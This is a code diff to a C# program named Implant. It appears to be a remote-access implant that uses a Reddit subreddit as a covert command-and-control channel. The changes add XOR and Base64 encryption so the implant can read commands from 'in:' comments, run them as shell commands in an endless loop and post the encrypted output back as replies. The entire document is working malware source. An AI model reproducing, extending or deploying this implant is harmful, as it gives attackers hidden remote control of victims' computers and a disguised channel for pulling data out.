@@ -10,28 +10,65 @@ using RedditSharp.Things;
 using System.Collections;
 using System.Xml.Linq;
 using System.Diagnostics;
+using System.Globalization;
 
 
 public class Implant
 {
+    public static string Encrypt(string message, string key)
+    {
+        int keyLength = key.Length;
+        int messageLength = message.Length;
+
+        // Encrypt the message with XOR
+        StringBuilder encryptedMessage = new StringBuilder();
+        for (int i = 0; i < messageLength; i++)
+        {
+            encryptedMessage.Append((char)(message[i] ^ key[i % keyLength]));
+        }
+
+        // Encode the encrypted message with Base64
+        return Convert.ToBase64String(Encoding.UTF8.GetBytes(encryptedMessage.ToString()));
+    }
+
+    public static string Decrypt(string encryptedMessage, string key)
+    {
+        int keyLength = key.Length;
+        int encryptedMessageLength = encryptedMessage.Length;
+
+        // Decode the encrypted message with Base64
+        byte[] decodedMessageBytes = Convert.FromBase64String(encryptedMessage);
+        string decodedMessage = Encoding.UTF8.GetString(decodedMessageBytes);
+
+        // Decrypt the message with XOR
+        StringBuilder message = new StringBuilder();
+        for (int i = 0; i < decodedMessage.Length; i++)
+        {
+            message.Append((char)(decodedMessage[i] ^ key[i % keyLength]));
+        }
+
+        return message.ToString();
+    }
+
     static void Main(string[] args)
     {
         //------ CONFIGURATIONS HERE -------
         string username = "myUsername";
-        string password = "myPassword!";
+        string password = "myPassword";
         string subreddit = "mySubreddit";
         string listenerID = "myListener";
+        string xorkey = "myxorkey";
         //----------------------------------
 
         //run the implant infinite times
         while (true)
         {
             string output = "";
-            string command = readTask(username, password, subreddit, listenerID);
+            string command = readTask(username, password, subreddit, listenerID, xorkey);
             //Console.WriteLine(command);
             output = runTask(command);
             //Console.WriteLine(output);
-            sendOutput(command, output, username, password, subreddit, listenerID);
+            sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
         }
     }
 
@@ -65,13 +102,16 @@ public class Implant
         // Read the output stream first and then wait.
         string output = p.StandardOutput.ReadToEnd();
         p.WaitForExit();
-        //Console.WriteLine(output);
+        Console.WriteLine(output);
 
         return output;
     }
 
-    static void sendOutput(string command, string output, string username, string password, string subreddit_name, string listenerID)
+    static void sendOutput(string command, string output, string username, string password, string subreddit_name, string listenerID, string xorkey)
     {
+        //encrypt and encode to base64
+        string ciphertext = Encrypt(output, xorkey);
+
         var reddit = new Reddit();
         reddit.User = reddit.LogIn(username, password);
         var subreddit = reddit.GetSubreddit("/r/" + subreddit_name);
@@ -82,11 +122,12 @@ public class Implant
             {
                 foreach (var comment in post.Comments)
                 {
-                    if (comment.Body.Contains(command))
+                    if (comment.Body.Contains("in:"))
                     {
                         using (WebClient client = new WebClient())
                         {
-                            comment.Reply("out: " + output);
+                            comment.Reply("out: b'" + ciphertext + "'"); //out: b'base64' which is recognized by python pattern
+                            System.Threading.Thread.Sleep(3000);
                             //add (executed) to the reply to tell the implant to not execute it twice, this is already done in teamserver
                             //comment.EditText("executed");
                         }
@@ -96,7 +137,7 @@ public class Implant
         }
     }
 
-    static string readTask(string username, string password, string subreddit_name, string listenerID)
+    static string readTask(string username, string password, string subreddit_name, string listenerID, string xorkey)
     {
         var reddit = new Reddit();
         reddit.User = reddit.LogIn(username, password);
@@ -124,18 +165,22 @@ public class Implant
         { //if there is a command appeneded in list, execute it
             var command = (list1.Last());
             //if the latest in: comment doesn't have a reply in it, execute it
-            command = command.Substring(3);
+            command = command.Substring(6);
+            command = command.Remove(command.Length - 1);
+
+            //decode and decrypt the command
+            string deciphertext = Decrypt(command, xorkey);
 
             //free the list
             list1.Clear();
-            return command;
+            return deciphertext;
         }
 
         //use recursion to execute the readTask() again, since no new command is retrieved
         else
         {
-            //Console.WriteLine("No task detected, searching again...");
-            return readTask(username, password, subreddit_name, listenerID);
+            Console.WriteLine("[+] No task detected, searching again...");
+            return readTask(username, password, subreddit_name, listenerID, xorkey);
         }
     }
 }
